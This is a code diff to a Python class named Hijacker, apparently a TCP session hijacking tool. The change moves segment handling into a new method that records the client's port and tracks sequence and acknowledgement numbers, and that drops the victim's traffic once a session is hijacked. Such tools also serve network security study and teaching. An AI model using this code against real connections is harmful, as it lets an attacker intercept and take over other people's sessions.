@@ -207,6 +207,21 @@ class Hijacker:
         seg_str += f'len {tcp_seg.length} flags {tcp_seg.get_flag_str()}'
         tools.print_rgb(seg_str, self.GREY, bold=False)
 
+    def __process_segment(self, ip_pk:ipv4.IPv4Packet, tcp_seg:tcp.TCPSegment):
+        if tcp_seg is not None:
+            if self.hijacked and self.__from_client(ip_pk, tcp_seg):
+                return
+            if self.hijacked and self.__from_server(ip_pk, tcp_seg):
+                return
+            if self.client_port == 0 and ip_pk.src_addr == self.client.ip_addr:
+                self.client_port = tcp_seg.src_port
+                self.__print_segment(tcp_seg)
+            if self.__from_client(ip_pk, tcp_seg):
+                self.client_port = tcp_seg.src_port
+                self.seq_nr = tcp_seg.seq_nr
+                self.ack_nr = tcp_seg.ack_nr
+                self.__print_segment(tcp_seg)
+
     def __process_frame(self, frame):
         if frame is None:
             return
@@ -214,16 +229,7 @@ class Hijacker:
         tcp_seg = tcp.TCPSegment.from_packet(ip_pk) if ip_pk.protocol == 6 else None
         if not self.__must_forward(ip_pk):
             return
-        if tcp_seg is not None:
-            if self.hijacked and self.__from_client(ip_pk, tcp_seg):
-                return
-            if self.hijacked and self.__from_server(ip_pk, tcp_seg):
-                return
-            if self.__from_client(ip_pk, tcp_seg):
-                self.client_port = tcp_seg.src_port
-                self.seq_nr = tcp_seg.seq_nr
-                self.ack_nr = tcp_seg.ack_nr
-                self.__print_segment(tcp_seg)
+        self.__process_segment(ip_pk, tcp_seg)
         server_mac = self.server.mac_addr
         if self.server_gateway is not None:
             server_mac = self.server_gateway.mac_addr
